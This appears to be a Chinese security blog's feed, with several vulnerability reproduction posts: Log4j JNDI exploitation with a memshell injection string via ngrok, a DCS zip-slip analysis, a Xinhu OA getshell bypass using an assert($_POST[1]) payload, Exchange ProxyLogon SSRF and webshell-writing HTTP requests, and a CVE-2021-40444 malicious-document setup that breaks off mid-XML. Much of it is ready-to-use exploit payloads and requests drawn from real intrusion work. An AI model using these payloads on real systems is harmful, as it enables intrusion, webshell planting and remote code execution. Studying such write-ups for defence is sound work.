ldap可以请求出去，但是无法加载利用<br><img src="https://static.aichat.net/chat/202112/b0e3516e-2431-4652-9bac-693d0f37d3a5.png" alt=""></p><p><img src="https://static.aichat.net/chat/202112/462f6476-bb7b-4791-b9e0-777b681a8767.png" alt=""></p><p>调用栈跟踪：（大哥跟的）<br><img src="https://static.aichat.net/chat/202112/ac71e84a-232b-4af6-b228-f6a2e6af3397.png" alt=""></p><p>致远|用友A8利用log4j getshell<br>JNDIExploit-1.2-SNAPSHOT.jar:<a href="https://github.com/0x727/JNDIExploit" target="_blank" rel="noopener">https://github.com/0x727/JNDIExploit</a></p><pre><code>Supported LADP Queries* all words are case INSENSITIVE when send to ldap server[+] Basic Queries: ldap://127.0.0.1:1389/Basic/[PayloadType]/[Params], e.g.    ldap://127.0.0.1:1389/Basic/Dnslog/[domain]    ldap://127.0.0.1:1389/Basic/Command/[cmd]    ldap://127.0.0.1:1389/Basic/Command/Base64/[base64_encoded_cmd]    ldap://127.0.0.1:1389/Basic/ReverseShell/[ip]/[port]  ---windows NOT supported    ldap://127.0.0.1:1389/Basic/TomcatEcho    ldap://127.0.0.1:1389/Basic/SpringEcho    ldap://127.0.0.1:1389/Basic/WeblogicEcho    ldap://127.0.0.1:1389/Basic/TomcatMemshell1    ldap://127.0.0.1:1389/Basic/TomcatMemshell2  ---need extra header [Shell: true]    ldap://127.0.0.1:1389/Basic/JettyMemshell    ldap://127.0.0.1:1389/Basic/WeblogicMemshell1    ldap://127.0.0.1:1389/Basic/WeblogicMemshell2    ldap://127.0.0.1:1389/Basic/JBossMemshell    ldap://127.0.0.1:1389/Basic/WebsphereMemshell    ldap://127.0.0.1:1389/Basic/SpringMemshell[+] Deserialize Queries: ldap://127.0.0.1:1389/Deserialization/[GadgetType]/[PayloadType]/[Params], e.g.    ldap://127.0.0.1:1389/Deserialization/URLDNS/[domain]    ldap://127.0.0.1:1389/Deserialization/CommonsCollectionsK1/Dnslog/[domain]    ldap://127.0.0.1:1389/Deserialization/CommonsCollectionsK2/Command/Base64/[base64_encoded_cmd]    ldap://127.0.0.1:1389/Deserialization/CommonsBeanutils1/ReverseShell/[ip]/[port]  ---windows NOT supported    ldap://127.0.0.1:1389/Deserialization/CommonsBeanutils2/TomcatEcho    ldap://127.0.0.1:1389/Deserialization/C3P0/SpringEcho    ldap://127.0.0.1:1389/Deserialization/Jdk7u21/WeblogicEcho    ldap://127.0.0.1:1389/Deserialization/Jre8u20/TomcatMemshell1    ldap://127.0.0.1:1389/Deserialization/CVE_2020_2555/WeblogicMemshell1    ldap://127.0.0.1:1389/Deserialization/CVE_2020_2883/WeblogicMemshell2    ---ALSO support other memshells[+] TomcatBypass Queries    ldap://127.0.0.1:1389/TomcatBypass/Dnslog/[domain]    ldap://127.0.0.1:1389/TomcatBypass/Command/[cmd]    ldap://127.0.0.1:1389/TomcatBypass/Command/Base64/[base64_encoded_cmd]    ldap://127.0.0.1:1389/TomcatBypass/ReverseShell/[ip]/[port]  ---windows NOT supported    ldap://127.0.0.1:1389/TomcatBypass/TomcatEcho    ldap://127.0.0.1:1389/TomcatBypass/SpringEcho    ldap://127.0.0.1:1389/TomcatBypass/TomcatMemshell1    ldap://127.0.0.1:1389/TomcatBypass/TomcatMemshell2   ---need extra header [Shell: true]    ldap://127.0.0.1:1389/TomcatBypass/SpringMemshell[+] GroovyBypass Queries    ldap://127.0.0.1:1389/GroovyBypass/Command/[cmd]    ldap://127.0.0.1:1389/GroovyBypass/Command/Base64/[base64_encoded_cmd][+] WebsphereBypass Queries    ldap://127.0.0.1:1389/WebsphereBypass/List/file=[file or directory]    ldap://127.0.0.1:1389/WebsphereBypass/Upload/Dnslog/[domain]    ldap://127.0.0.1:1389/WebsphereBypass/Upload/Command/[cmd]    ldap://127.0.0.1:1389/WebsphereBypass/Upload/Command/Base64/[base64_encoded_cmd]    ldap://127.0.0.1:1389/WebsphereBypass/Upload/ReverseShell/[ip]/[port]  ---windows NOT supported    ldap://127.0.0.1:1389/WebsphereBypass/Upload/WebsphereMemshell    ldap://127.0.0.1:1389/WebsphereBypass/RCE/path=[uploaded_jar_path]   ----e.g: ../../../../../tmp/jar_cache7808167489549525095.tmp</code></pre><p>VPS/本地+ngrok<br><img src="https://static.aichat.net/chat/202112/3535500d-616d-4383-a347-de618310fe6e.png" alt=""></p><p>登录框插</p><pre><code>${jndi:ldap://4.tcp.ngrok.io:14296/Basic/TomcatMemshell2}</code></pre><p><img src="https://static.aichat.net/chat/202112/6deb3459-2646-40ed-a98a-3af3f92410c4.png" alt=""></p><p><img src="https://static.aichat.net/chat/202112/6d7d8566-f28f-4d38-879e-989199721561.png" alt=""></p><p>现存在问题:有些不行但是ldap能请求出来(一般是版本不行,不会bypass)</p><p>上线shellcode<br>将java执行shellcode编译为class，配合marshalsec即可<br><img src="https://static.aichat.net/chat/202112/63710e6a-a42e-494d-a297-b01aa2b25345.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://help.aliyun.com/noticelist/articleid/1060971232.html" target="_blank" rel="noopener">https://help.aliyun.com/noticelist/articleid/1060971232.html</a><br><a href="https://mp.weixin.qq.com/s/l7iclJRegADs3oiEdcgAvQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/l7iclJRegADs3oiEdcgAvQ</a><br><a href="https://mp.weixin.qq.com/s/15zcLEk6_x2enszhim9afA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/15zcLEk6_x2enszhim9afA</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;漏洞介绍&quot;&gt;&lt;a href=&quot;#漏洞介绍&quot; class=&quot;headerlink&quot; title=&quot;漏洞介绍&quot;&gt;&lt;/a&gt;漏洞介绍&lt;/h2&gt;&lt;p&gt;Log4j-2中存在JNDI注入漏洞，当程序将用户输入的数据被日志记录时，即可触发此漏洞，成功利用此漏洞可以在目标服务器上执</summary>
      
    
    
    
    
    <category term="漏洞复现" scheme="http://422926799.github.io/tags/漏洞复现/"/>
    
  </entry>
  
  <entry>
    <title>某DCS zip Slip任意写文件漏洞</title>
    <link href="http://422926799.github.io/posts/d1787975.html"/>
    <id>http://422926799.github.io/posts/d1787975.html</id>
    <published>2021-12-05T00:53:20.000Z</published>
    <updated>2021-12-05T01:17:37.089Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>hw的时候遇到的，结束后复现找了一下漏洞代码<br><img src="https://i.bmp.ovh/imgs/2021/12/1ec77b267b96fd4d.png" alt=""></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>漏洞url:</p><pre><code>/dcs.web/upload?convertType=19&amp;isSourceDir=0</code></pre><p>文档说明<br><img src="https://s4.ax1x.com/2021/12/05/oBnmE8.png" alt=""></p><p><img src="https://s4.ax1x.com/2021/12/05/oBnu4g.png" alt=""></p><p>upload处理点<br><img src="https://s4.ax1x.com/2021/12/05/oBnQ3j.png" alt=""></p><p><img src="https://s4.ax1x.com/2021/12/05/oBn1vn.png" alt=""></p><p>config.inputDir.getPath()获取config.properties里的dir.input，然后设置了三个属性值:</p><pre><code>* fname - 文件名* finput - 文件上传后的路径* sourceRelativepath - 生成的UUID</code></pre><p><img src="https://s4.ax1x.com/2021/12/05/oBnw8J.png" alt=""></p><p>文件写入到input目录后，返回json请求/convert进行处理<br>首先调用buildParam函数进行处理<br><img src="https://s4.ax1x.com/2021/12/05/oBnyb6.png" alt=""></p><p>获取convertType参数，然后转换成int类型。传入EnumConvertType.getEnum判断值是否存在hash表里<br><img src="https://s4.ax1x.com/2021/12/05/oBncVK.png" alt=""></p><p><img src="https://s4.ax1x.com/2021/12/05/oBn25D.png" alt=""></p><p><img src="https://s4.ax1x.com/2021/12/05/oBnh2d.png" alt=""></p><p>经过获取一些请求参数后，然后来到 String lowrealInput = realInput.toLowerCase()<br><img src="https://s4.ax1x.com/2021/12/05/oBn4xA.png" alt=""></p><p>往上跟踪发现取finput属性，获取inputDir，outputDir，zipFileName，zipOutput请求参数。然后进行判断，由于请求都没有带到这些参数所以去到finput<br><img src="https://s4.ax1x.com/2021/12/05/oBnort.png" alt=""></p><p>然后进入大判断，判断lowrealInput尾部是否存在对应的后缀，并将EnumConvertType设置为对应的hash表key<br><img src="https://s4.ax1x.com/2021/12/05/oBnHVf.png" alt=""></p><p>然后去到284行，获取fname，fileName属性的值。判断fileName不为空调用setFIleName函数。设置this.fileName,然后获取compressedSuffix请求参数，最后判断enumType不为空调用updateFilePath函数<br><img src="https://s4.ax1x.com/2021/12/05/oBnqIS.png" alt=""></p><p><img src="https://s4.ax1x.com/2021/12/05/oBnXGQ.png" alt=""></p><p>updateFilePath函数<br><img src="https://s4.ax1x.com/2021/12/05/oBnj2j.png" alt=""></p><p>后面就是对一些请求参数转int进行设置<br><img src="https://s4.ax1x.com/2021/12/05/oBnvxs.png" alt=""></p><p>回到ConvertParamBuilder.class，经过checkParam函数判断是不是pdf，然后单独开个线程处理然后生成json调用getJsonResult函数<br><img src="https://s4.ax1x.com/2021/12/05/oBuiIU.png" alt=""></p><p>getJsonResult函数<br><img src="https://s4.ax1x.com/2021/12/05/oBuAG4.png" alt=""></p><p><img src="https://s4.ax1x.com/2021/12/05/oBuVz9.png" alt=""></p><p>getResultDate函数生成返回的url<br><img src="https://s4.ax1x.com/2021/12/05/oBueMR.png" alt=""></p><p>ZipService.zipfile函数，先获取tmpDir目录然后调用copyDirectiory函数将input目录下上传的文件copy到out目录。最后调用zip函数<br><img src="https://s4.ax1x.com/2021/12/05/oBuKZ6.png" alt=""></p><p>zip函数如下<br><img src="https://s4.ax1x.com/2021/12/05/oBuQIO.png" alt=""></p><p>zip函数<br><img src="https://s4.ax1x.com/2021/12/05/oBu3Je.png" alt=""></p><p>引用一张图<br><img src="https://s4.ax1x.com/2021/12/05/oBuYQA.png" alt=""></p><p>参考链接:<a href="https://saucer-man.com/information_security/364.html" target="_blank" rel="noopener">https://saucer-man.com/information_security/364.html</a></p><p><img src="https://s4.ax1x.com/2021/12/05/oButsI.png" alt=""></p><p><img src="https://s4.ax1x.com/2021/12/05/oBucyn.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;hw的时候遇到的，结束后复现找了一下漏洞代码&lt;br&gt;&lt;img src=&quot;https://i.bmp.ovh/imgs/2021/12/1ec</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>信呼OA V2.3.0 治标不治本的配置文件getshell重新利用</title>
    <link href="http://422926799.github.io/posts/3541f020.html"/>
    <id>http://422926799.github.io/posts/3541f020.html</id>
    <published>2021-10-18T13:56:13.000Z</published>
    <updated>2021-10-18T14:09:23.686Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>参考链接：<a href="https://www.freebuf.com/articles/web/286380.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/286380.html</a><br>最近打点的时候遇见个信呼OA，用的上述的<code>后台配置文件getshell</code>方法成过getshell<br>原本打算复现一下的，后面一看版本最新的。。。<br>(后面重新看了一下，发现修复不严谨。在后台用户重命名处修改即可重新利用)<br><img src="https://z3.ax1x.com/2021/10/18/5a8IFH.png" alt=""></p><h2 id="代码跟踪"><a href="#代码跟踪" class="headerlink" title="代码跟踪"></a>代码跟踪</h2><p>在V2.2.8的时候报出一处update拼接管理员名的注入+配置文件插入管理员修改config文件的信息<br>之前的payload利用：</p><pre><code>http://127.0.0.1/index.php?a=changestyle&amp;m=geren&amp;d=system&amp;ajaxbool=true&amp;style=21,id=1,name=0x610A6576616C28245F504F53545B315D293B2F2Fhttp://127.0.0.1/index.php?a=savecong&amp;m=cog&amp;d=system&amp;ajaxbool=true&amp;rnd=705961a:函数名称m:类名称d:处理文件文件夹父路径名称</code></pre><p>路由分析<br><img src="https://z3.ax1x.com/2021/10/18/5aGa9A.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/10/18/5aGrB8.png" alt=""></p><p>以前的漏洞点分析:<br>gerenClassAction函数更新管理员信息的点<br><img src="https://z3.ax1x.com/2021/10/18/5aGghj.png" alt=""></p><p>在V2.3.0后，int强转只取第一个参数的值<br>（一开始没看仔细还以为那里做了过滤，后面更了post也没发现那里不对。最好才看见这个int）<br><img src="https://z3.ax1x.com/2021/10/18/5aGHN4.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/10/18/5aJ9ED.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/10/18/5aJeDf.png" alt=""></p><p>但是saveCongAjax函数没任何变化<br><img src="https://z3.ax1x.com/2021/10/18/5aJlCj.png" alt=""></p><p>直接利用后台的用户改名功能重命名管理员的名称，在rockClass.php新建了函数过滤，eval被砍了。直接用assert代替即可<br><img src="https://z3.ax1x.com/2021/10/18/5aJUVU.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/10/18/5aJ0PJ.png" alt=""></p><h2 id="死灰复燃"><a href="#死灰复燃" class="headerlink" title="死灰复燃"></a>死灰复燃</h2><p>用户管理处修改当前登录管理的姓名为:<code>\rassert($_POST[1]);//</code><br><img src="https://z3.ax1x.com/2021/10/18/5aJIxI.png" alt=""></p><p>访问<a href="http://127.0.0.1/index.php?a=savecong&amp;m=cog&amp;d=system&amp;ajaxbool=true&amp;rnd=705961" target="_blank" rel="noopener">http://127.0.0.1/index.php?a=savecong&amp;m=cog&amp;d=system&amp;ajaxbool=true&amp;rnd=705961</a> 即可<br><img src="https://z3.ax1x.com/2021/10/18/5aJOIg.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/10/18/5aYiZT.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;参考链接：&lt;a href=&quot;https://www.freebuf.com/articles/web/286380.html&quot; target</summary>
      
    
    
    
    
    <category term="Writing" scheme="http://422926799.github.io/tags/Writing/"/>
    
  </entry>
  
  <entry>
    <title>Exchange (CVE-2021-26855和CVE-2021-27065)复现</title>
    <link href="http://422926799.github.io/posts/a0e15799.html"/>
    <id>http://422926799.github.io/posts/a0e15799.html</id>
    <published>2021-09-23T08:39:40.000Z</published>
    <updated>2021-09-23T09:48:04.266Z</updated>
    
    <content type="html"><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><pre><code>* DC一台* Exchange一台</code></pre><p>前置介绍:<br>Exchange Server CU18 V15</p><pre><code>* CU18是更新的次数 - (*Exchange更新不以补丁方式更新，直接更新整个框架*)* V15 - Exchange的版本号</code></pre><p>Exchange下载链接:<a href="https://www.microsoft.com/en-us/download/details.aspx?id=102114" target="_blank" rel="noopener">https://www.microsoft.com/en-us/download/details.aspx?id=102114</a><br>注意:</p><pre><code>windows server 2012 - 可安装:Exchange 2013、Exchange 2016 -&gt;安装Exchange还需要多打个补丁推荐2016windows server 2016 - 可安装:Exchange 2016windows server 2019 - 可安装:Exchange 2016、Exchange 2019 -&gt;建议安装2019建议对照OS版本和Exchange版本安装，否则会出现一些奇怪的问题ExchangeExchange Server系统要求:https://docs.microsoft.com/en-us/exchange/plan-and-deploy/system-requirements?preserve-view=true&amp;view=exchserver-2016#supported-operating-systems-for-exchange-2016Exchange共存和兼容方案:https://docs.microsoft.com/zh-cn/exchange/plan-and-deploy/system-requirements?view=exchserver-2019-----------------------------------------------------------------------虚拟机内存至少4G虚拟机硬盘大小最小90G，安装Exchange需要80G-----------------------------------------------------------------------1. 以管理员身份运行Windows Powershell，安装必需的 Windows组件：Install-WindowsFeature NET-Framework-45-Features, Server-Media-Foundation, RPC-over-HTTP-proxy, RSAT-Clustering, RSAT-Clustering-CmdInterface, RSAT-Clustering-Mgmt, RSAT-Clustering-PowerShell, WAS-Process-Model, Web-Asp-Net45, Web-Basic-Auth, Web-Client-Auth, Web-Digest-Auth, Web-Dir-Browsing, Web-Dyn-Compression, Web-Http-Errors, Web-Http-Logging, Web-Http-Redirect, Web-Http-Tracing, Web-ISAPI-Ext, Web-ISAPI-Filter, Web-Lgcy-Mgmt-Console, Web-Metabase, Web-Mgmt-Console, Web-Mgmt-Service, Web-Net-Ext45, Web-Request-Monitor, Web-Server, Web-Stat-Compression, Web-Static-Content, Web-Windows-Auth, Web-WMI, Windows-Identity-Foundation, RSAT-ADDS2. 安装.NET Framework 4.7.2或更高版本（微软官网）3. 安装Visual C++ Redistributable Package for Visual Studio 2012   https://www.microsoft.com/en-US/download/details.aspx?id=306794. 安装Visual C++ Redistributable Package for Visual Studio 2013   https://www.microsoft.com/en-us/download/details.aspx?id=407845. 安装Microsoft统一通信托管API 4.0 核心运行时（64 位）https://www.microsoft.com/en-US/download/details.aspx?id=349926. Exchange Server加域7. 安装Exchange Server 20168.   DC新建一个用户，用户所在组(Domain Admins/Enterprise Admins/Schema Admins)9.   等待安装（安装过程中不要重启，否则会出现问题，例如:Exchange安装包损坏，域环境出问题，安装到一半无法继续安装）</code></pre><p><a href="https://www.cnblogs.com/shenhaiyu111/p/12221101.html" target="_blank" rel="noopener">https://www.cnblogs.com/shenhaiyu111/p/12221101.html</a> - Exchange Server 2016 本地部署安装流程<br><a href="https://docs.microsoft.com/en-us/exchange/plan-and-deploy/deploy-new-installations/install-mailbox-role?view=exchserver-2019" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/exchange/plan-and-deploy/deploy-new-installations/install-mailbox-role?view=exchserver-2019</a> - 安装过程</p><p>安装时间大概需要30~40分钟（如果准备没问题可直接进行安装，如果出现报错根据给出的问题解决）</p><p>个人安装的环境如下</p><pre><code>Exchange Server |OS:Windows Server 2016|version:CU18、V15DC|domain:YAYI.local|OS:Windows Server 2012</code></pre><p>安装完成访问后如下<br><img src="https://z3.ax1x.com/2021/09/23/4wNvtI.png" alt=""></p><p>安装完后需要配置的：</p><pre><code>1. 允许以&lt;username&gt;@&lt;domain&gt;方式登录2. 配置外部URL访问</code></pre><p>允许以<username>@<domain>方式登录<br><img src="https://z3.ax1x.com/2021/09/23/4wUp1f.png" alt=""></domain></username></p><p>配置外部URL访问<br>（ecp和owa都要改）<br><img src="https://z3.ax1x.com/2021/09/23/4wai26.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/23/4wUn3V.png" alt=""></p><p>新建用户<br>Exchange安装完后只有当前机器加入的域用户，在Exchange新建用户===域新建普通用户<br>添加用户有两种方法：</p><pre><code>* 新建用户* 从现有的域用户添加用户（现有域用户所在的组有什么权限，添加后的用户就有什么权限）</code></pre><p><img src="https://z3.ax1x.com/2021/09/23/4waMGt.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/23/4waQRP.png" alt=""></p><p>邮件发送测试<br><img src="https://z3.ax1x.com/2021/09/23/4wataj.png" alt=""></p><h2 id="CVE-2021–26855-SSRF漏洞复现"><a href="#CVE-2021–26855-SSRF漏洞复现" class="headerlink" title="CVE-2021–26855 - SSRF漏洞复现"></a>CVE-2021–26855 - SSRF漏洞复现</h2><pre><code>POST /ecp/1.ttf HTTP/1.1Host: 100.100.5.137Connection: closeUpgrade-Insecure-Requests: 1DNT: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Sec-Fetch-Site: same-originSec-Fetch-Mode: navigateSec-Fetch-Dest: iframeReferer: https://100.100.5.137/ecp/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,ug;q=0.8Content-Type: text/xmlCookie: X-BEResource=WIN-KCL6ANQQ2CH.yayi.local/autodiscover/autodiscover.xml?a=#~1;Content-Length: 338&lt;Autodiscover xmlns=&quot;http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006&quot;&gt;    &lt;Request&gt;      &lt;EMailAddress&gt;pentest@yayi.local&lt;/EMailAddress&gt; &lt;AcceptableResponseSchema&gt;http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a&lt;/AcceptableResponseSchema&gt;    &lt;/Request&gt;&lt;/Autodiscover&gt;</code></pre><p>返回对应邮箱用户的信息<br><img src="https://z3.ax1x.com/2021/09/23/4wacdJ.png" alt=""></p><p>漏洞触发过程:<br>OnPostAuthorizeRequest函数,该函数用于对post请求的安全检查,函数中继续调用了该类的OnPostAuthorizeInternal函数<br>OnPostAuthorizeInternal函数中调用SelectHandlerForUnauthenticatedRequest<br><img src="https://z3.ax1x.com/2021/09/23/4wdSOS.png" alt=""></p><p>SelectHandlerForUnauthenticatedRequest函数处理对应的请求路径<br><img src="https://z3.ax1x.com/2021/09/23/4wdAWq.png" alt=""></p><p>最后去到BEResourceRequestHandler.CanHandle(httpContext.Request)<br><img src="https://z3.ax1x.com/2021/09/23/4wdUmD.png" alt=""></p><p>CanHandle如果要返回真,则需要同时让GetBEResouceCookie和IsResourceRequest函数同时返回值为真。跟进这两个函数。<br><img src="https://z3.ax1x.com/2021/09/23/4wwCjK.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/09/23/4wwFBD.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/09/23/4wwugP.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/09/23/4wwlDS.png" alt=""></p><p>经过返回调用去到ResolveAnchorMailbox函数<br><img src="https://z3.ax1x.com/2021/09/23/4wwsUJ.png" alt=""></p><p>获取cookie X-BEResource的值，走到FromString，试用~进行分割<br><img src="https://z3.ax1x.com/2021/09/23/4wwy59.png" alt=""></p><p>在ProxyRequestHandler.BeginProxyRequest函数中调用的的GetTargetBackEndServerUrl函数进行调用<br><img src="https://z3.ax1x.com/2021/09/23/4wwRv6.png" alt=""></p><p>继续看ProxyRequestHandler.BeginProxyRequest后面,ProxyRequestHandler.CreateServerRequest将吧uri发送给后端服务器<br><img src="https://z3.ax1x.com/2021/09/23/4ww4bD.png" alt=""></p><p>跟踪ProxyRequestHandler.CreateServerRequest,函数中PrepareServerRequest将进行uri代理请求的身份认证判断，通过最后一个else绕过认证,达到一个SSRF漏洞攻击的过程<br><img src="https://z3.ax1x.com/2021/09/23/4wwT5d.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/09/23/4wwXKf.png" alt=""></p><h2 id="CVE-2021–27065任意文件写入"><a href="#CVE-2021–27065任意文件写入" class="headerlink" title="CVE-2021–27065任意文件写入"></a>CVE-2021–27065任意文件写入</h2><p>编辑OAB配置，在外部链接中写⼊shell并保存<br><img src="https://z3.ax1x.com/2021/09/23/4w0CPs.png" alt=""></p><p>重置虚拟目录处写对应的UNC路径，点击重置<br><img src="https://z3.ax1x.com/2021/09/23/4w0eZF.png" alt=""></p><p>在Exchange Server机器上即可找到写入的shell<br><img src="https://z3.ax1x.com/2021/09/23/4w0NIH.png" alt=""></p><p>现成工具<br>SSRF+绕过登录+任意文件写入===RCE<br><img src="https://z3.ax1x.com/2021/09/23/4w0DQP.png" alt=""></p><p>先通过SSRF获取目标机器的信息<br><img src="https://z3.ax1x.com/2021/09/23/4w0hzq.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/23/4w07eU.png" alt=""></p><p>然后构造请求cookie：X-BEResource=&lt;上一步获取到Exchange Server HostName&gt;/autodiscover/autodiscover.xml?a=~1;<br><img src="https://z3.ax1x.com/2021/09/23/4wBAfA.png" alt=""></p><p>获取legacYDN<br><img src="https://www.mpimg.cn/images/2021/09/23/Image.png" alt=""></p><p>然后请求得到SID<br><img src="https://www.mpimg.cn/images/2021/09/23/Imagec39d926bdc3e3d63.png" alt=""></p><p>构造JSON请求获取登录cookie<br><img src="https://www.mpimg.cn/images/2021/09/23/Image1dfa6cfa6c16e4ad.png" alt=""></p><p>请求获取ECP的RawIdentity<br><img src="https://www.mpimg.cn/images/2021/09/23/Image68352f9b96279cd9.png" alt=""></p><p>shell写入<br><img src="https://www.mpimg.cn/images/2021/09/23/Imagef068ad3d2a095634.png" alt=""></p><p>路径写入并重置</p><pre><code>POST /ecp/iikj.js HTTP/1.1Host: 192.168.93.135User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36Accept-Encoding: gzip, deflateAccept: */*Connection: closeCookie: X-BEResource=Administrator@WIN-KCL6ANQQ2CH.YAYI.local:444/ecp/DDI/DDIService.svc/SetObject?schema=ResetOABVirtualDirectory&amp;msExchEcpCanary=MbAJ26WCAk6Yisdw_SmpymgBqW31f9kIoxPEixgESnzNd6nbtbC0_wBn68G5lmxxKrl586QkRNA.&amp;a=~1942062522; ASP.NET_SessionId=7e41e4fe-6c9c-4830-a3df-ed346a6ba284; msExchEcpCanary=MbAJ26WCAk6Yisdw_SmpymgBqW31f9kIoxPEixgESnzNd6nbtbC0_wBn68G5lmxxKrl586QkRNA.msExchLogonMailbox: S-1-5-20Content-Type: application/json; charset=utf-8Content-Length: 393{&quot;identity&quot;: {&quot;__type&quot;: &quot;Identity:ECP&quot;, &quot;DisplayName&quot;: &quot;OAB (Default Web Site)&quot;, &quot;RawIdentity&quot;: &quot;977787fb-ece0-454e-9363-2cd8579ca39e&quot;}, &quot;properties&quot;: {&quot;Parameters&quot;: {&quot;__type&quot;: &quot;JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel&quot;, &quot;FilePathName&quot;: &quot;\\\\127.0.0.1\\c$\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\c1gfR60IjXo3CBSLuwtW.aspx&quot;}}}</code></pre><p><img src="https://www.mpimg.cn/images/2021/09/23/Image55f36ab04c398cb9.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.cnblogs.com/-zhong/p/14533053.html" target="_blank" rel="noopener">https://www.cnblogs.com/-zhong/p/14533053.html</a><br><a href="https://forum.butian.net/share/539" target="_blank" rel="noopener">https://forum.butian.net/share/539</a><br><a href="https://www.cnblogs.com/shenhaiyu111/p/12221101.html" target="_blank" rel="noopener">https://www.cnblogs.com/shenhaiyu111/p/12221101.html</a><br><a href="https://jishuin.proginn.com/p/763bfbd5ac72" target="_blank" rel="noopener">https://jishuin.proginn.com/p/763bfbd5ac72</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;* DC一台
* Exchange一台
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;前置介绍:&lt;br&gt;Exchange </summary>
      
    
    
    
    
    <category term="漏洞复现" scheme="http://422926799.github.io/tags/漏洞复现/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2021-40444漏洞复现</title>
    <link href="http://422926799.github.io/posts/3e27999a.html"/>
    <id>http://422926799.github.io/posts/3e27999a.html</id>
    <published>2021-09-13T08:25:37.000Z</published>
    <updated>2021-09-13T08:48:34.866Z</updated>
    
    <content type="html"><![CDATA[<h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><p>office 2016<br>windows 10 ver:1909</p><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>和十年前的IE网马一样，IE自动安装新的插件导致该漏洞，以及office可以引用mshtml格式，导致排版引擎模板可执行</p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>（安了office 2016才有的CLSID，office 2010并没有）<br>这个漏洞是利用ie的COM口实现的。CLSID:edbc374c-5730-432a-b5b8-de94f0b57217<br><img src="https://z3.ax1x.com/2021/09/13/4PcrSH.png" alt=""></p><p>安了office 2010的win7<br><img src="https://z3.ax1x.com/2021/09/13/4Pcgmt.png" alt=""></p><p>原样本地址：<a href="https://app.any.run/tasks/36c14029-9df8-439c-bba0-45f2643b0c70/#" target="_blank" rel="noopener">https://app.any.run/tasks/36c14029-9df8-439c-bba0-45f2643b0c70/#</a><br>修改word/_rels/document.xml，将hdusi.com改为自己的IP</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;&lt;Relationships xmlns=&quot;http://schemas.openxmlformats.org/package/2006/relationships&quot;&gt;&lt;Relationship Id=&quot;rId8&quot; Type=&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme&quot; Target=&quot;theme/theme1.xml&quot;/&gt;&lt;Relationship Id=&quot;rId3&quot; Type=&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/webSettings&quot; Target=&quot;webSettings.xml&quot;/&gt;&lt;Relationship Id=&quot;rId7&quot; Type=&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/fontTable&quot; Target=&quot;fontTable.xml&quot;/&gt;&lt;Relationship Id=&quot;rId2&quot; Type=&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/settings&quot; Target=&quot;settings.xml&quot;/&gt;&lt;Relationship Id=&quot;rId1&quot; Type=&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles&quot; Target=&quot;styles.xml&quot;/&gt;&lt;Relationship Id=&quot;rId6&quot; 